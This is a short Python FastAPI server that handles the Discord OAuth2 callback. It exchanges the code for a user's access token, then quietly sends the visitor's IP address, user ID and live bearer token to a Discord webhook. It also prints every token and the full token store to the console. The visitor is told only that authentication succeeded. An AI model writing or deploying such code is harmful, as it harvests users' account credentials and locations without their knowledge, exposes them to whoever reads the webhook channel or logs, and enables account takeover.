from fastapi import FastAPI, Request
import aiohttp
import os
from dotenv import load_dotenv

load_dotenv()

app = FastAPI()

CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

authenticated_users = {}

async def send_ip_to_discord(ip, user_id, access_token):
    print("📤 웹훅 전송 시도 중...")
    print(f"🔗 웹훅 URL 확인: {WEBHOOK_URL}")
    async with aiohttp.ClientSession() as session:
        res = await session.post(WEBHOOK_URL, json={
            "content": (
                f"🆕 인증 성공!\n"
                f"🕵️‍♂️ IP: `{ip}`\n"
                f"🆔 User ID: `{user_id}`\n"
                f"🔐 Access Token: `{access_token}`"
            )
        })
        print(f"📨 웹훅 응답 상태: {res.status}")
        if res.status not in (200, 204):
            error = await res.text()
            print(f"❌ 웹훅 전송 실패: {error}")

@app.get("/callback")
async def callback(request: Request):
    print("✅ [callback] 시작됨")

    code = request.query_params.get("code")
    client_ip = request.client.host
    print(f"🔑 code: {code}, IP: {client_ip}")

    async with aiohttp.ClientSession() as session:
        data = {
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI
        }
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        async with session.post("https://discord.com/api/oauth2/token", data=data, headers=headers) as res:
            token_json = await res.json()
            print("📦 token_json:", token_json)
            access_token = token_json.get("access_token")

        headers = {"Authorization": f"Bearer {access_token}"}
        async with session.get("https://discord.com/api/users/@me", headers=headers) as res:
            user_json = await res.json()
            print("👤 user_json:", user_json)
            user_id = user_json["id"]

        authenticated_users[user_id] = access_token
        print(f"💾 인증된 유저 저장 완료: {authenticated_users}")

        await send_ip_to_discord(client_ip, user_id, access_token)

    print("🎉 [callback] 종료됨\n")
    return {"message": "인증 완료되었습니다. 운영자가 초대할 것입니다."}
